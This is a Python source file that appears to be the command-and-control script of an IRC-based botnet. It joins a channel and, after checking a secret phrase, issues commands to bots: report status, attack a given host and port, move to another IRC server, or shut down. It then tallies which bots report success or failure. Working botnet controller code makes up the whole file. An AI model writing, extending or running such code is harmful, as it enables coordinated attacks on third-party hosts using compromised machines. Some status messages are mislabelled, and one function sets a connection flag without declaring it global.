import time
import socket
import sys
import random
import select

ERROR_FLAG = -1	
	

#connection info
irc = ""
channel = "#"
con_active = False

#controller info
nick = "controller"
atk_cnt = 0
active = True


def list_names(names):
	for name in names:
		print(name)
		
def list_statuses(names, status):
	i = 0
	while i < len(names):
		print(names[i] + ": " + status)
		i +=1

'''
------------------------------------------------------------------------
                             Commands 
------------------------------------------------------------------------
'''


#runs status command on bots, prints result
def cmd_status():
	send_command("status")
	msg = rcv_irc_response()
	bot_names = []
	if msg == ERROR_FLAG:
		pass
	else:
		#extract individual responses
		msg = msg.strip()
		msgs = msg.split("\n")
		for m in msgs:
			if m.startswith(":V"):
				bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
	#print returned info
	print("num of bots: " + str(len(bot_names)))
	list_names(bot_names)
	return
	
	
#tells the bots to attack the hostname
def cmd_attack(hostname, port):
	send_command("attack "+ hostname + " " + port)
	msg = rcv_irc_response()
	successes = []
	failures = []
	if msg == ERROR_FLAG:
		pass
	else:
		#extract individual responses
		msg = msg.strip()
		msgs = msg.split("\n")
		for m in msgs:
			bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
			bot_status = bot_status.split()
			if len(bot_status) == 2: 
				bot = bot_status[0]
				status = bot_status[1]
				if status == "success":
					successes.append(bot)
				elif status == "failure":
					failures.append(bot)
	print("Successful attack bots: " + str(len(successes)))
	list_statuses(successes, "attack success")
	print("Failed attacking bots: " + str(len(failures)))
	list_statuses(failures, "attack failure")
	return


#move bots from current irc to new irc
def cmd_move(hostname, port, chan):
	send_command("move "+ hostname + " " + port + " " + chan)
	msg = rcv_irc_response()
	successes = []
	failures = []
	if msg == ERROR_FLAG:
		pass
	else:
		#extract individual responses
		msg = msg.strip()
		msgs = msg.split("\n")
		for m in msgs:
			bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
			bot_status = bot_status.split()
			if len(bot_status) == 2: 
				bot = bot_status[0]
				status = bot_status[1]
				if status == "success":
					successes.append(bot)
				elif status == "failure":
					failures.append(bot)
	print("Successfully moved bots: " + str(len(successes)))
	list_statuses(successes, "attack success")
	print("Failed moving bots: " + str(len(failures)))
	list_statuses(failures, "attack failure")
	return


#controller will disconnect from the bots and terminate
def cmd_quit():
	global active
	send("QUIT")
	active = False	
	return


#this kills the bot(s)
def cmd_shutdown():
	send_command("shutdown")
	msg = ""
	bot_names = []
	numbots = 0
	msg = rcv_irc_response()
	if msg == ERROR_FLAG:
		pass
	else:
		#extract individual responses
		msg = msg.strip()
		msgs = msg.split("\n")
		for line in msgs:
			bot_status = (line[line.find(':', 1)+1:] + "\n").strip()
			bot_status = bot_status.split()
			if len(bot_status) == 2: 
				bot = bot_status[0]
				status = bot_status[1]
				if status == "shutdown":
					bot_names.append(bot)
					print(bot + ": shutting down... ")
	print("Total: "+str(len(bot_names))+" bots shut down")
	return


'''
------------------------------------------------------------------------
                             Communication w/ IRC
------------------------------------------------------------------------
'''	


#send to irc as bytes
def send(msg):
	global con_active
	try:
		irc.send(msg.encode('UTF-8', 'ignore'))
	except socket.error:
		con_active = False
	return
	
	
#receive responses from bots
def rcv_irc_response():
	while True:
		try:
			#receive responses
			msg = irc.recv(1024).decode()
			#passively handle PING PONG
			if msg.find('PING') != -1:
				send('PONG ' + msg.split()[1] + '\r\n')
			else:		
				break
		#if timeout, return error else return error and signify connection dead
		except socket.error as err:
			if err == socket.timeout:
				pass
			else:
				con_active = False
			return ERROR_FLAG
	return msg
		

#send a command to the bots
def send_command(msg):
	send("PRIVMSG " + channel + " :" + msg + " " + nick + " " + secret_phrase + "\n")
	time.sleep(3)
	return
	

#connect to the specified IRC server and channel
def connect(host, port):
	global nick, irc, con_active
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	irc.settimeout(1)
	try:
		irc.connect((host,port))
		con_active = True
		print("connection made")
	except socket.error:
		print("Error: Could not make connection")
		return ERROR_FLAG
		
	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
	send("NICK " + nick + "\n")
	send("JOIN " + channel + "\n")
	return 


'''
------------------------------------------------------------------------
                             Communication loop
------------------------------------------------------------------------
'''


#handle the connection to the IRC server
def handle_connection():
	print('command> ', end = '', flush=True)
	while active:
		readable, writeable, exceptable = select.select([irc,sys.stdin],[sys.stdout],[])
		for s in readable:
			##check the type
			#if s std do cmds
			if s == sys.stdin:
				msg = sys.stdin.readline()
				cmd = msg.split()
				if msg == "\n":
					pass
				elif cmd[0] == 'status':	
					cmd_status()
				elif cmd[0] == "attack":
					try:
						cmd_attack(cmd[1],cmd[2])
					except IndexError:
						print("Error: Insufficient arguments for cmd(attack)")
				elif cmd[0] == "move":
					try:
						cmd_move(cmd[1], cmd[2], cmd[3]) 
					except IndexError:
						print("Error: Insufficient arguments for cmd(move)")
				elif cmd[0] == "quit":
					cmd_quit()
					break 
				elif cmd[0] == "shutdown":
					cmd_shutdown()
				elif con_active == False:
					break
				else:
					print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
				print('command> ', end = '', flush=True)
			#else deal with Ping Pong
			elif s == irc:			
				msg = irc.recv(1024).decode()
				if msg.find('PING') != -1:
					send('PONG ' + msg.split()[1] + '\r\n')
			if con_active == False:
					break
	return
	

'''
------------------------------------------------------------------------
                             Program loop
------------------------------------------------------------------------
'''


#main
def main():
	global channel, secret_phrase
	hostname = ""
	port = 0
	secret_phrase = ""
	
	#ensure correct number of commands
	if len(sys.argv) != 5:
		print("Error: Incorrect number of command line arguments. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#ensure port is a number
	if not sys.argv[2].isdigit():
		print("Error: Command argument 2 could not be processed. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#extract arguments from command line
	hostname = sys.argv[1]
	port = int(sys.argv[2])
	channel = channel + sys.argv[3]
	secret_phrase = sys.argv[4]
	
	#loop to keep trying to connect to irc when not shutdown
	while True:
		#connect to the IRC server
		status = connect(hostname, port)
		
		if status != ERROR_FLAG:
			#handle the connection
			handle_connection()
		#if handle_connection exited without shutdown command
		if active == True:
			#wait 5 seconds before retrying connection
			time.sleep(5)
		else:
			break
	return


'''
------------------------------------------------------------------------
                             Call Program
------------------------------------------------------------------------
'''


main()
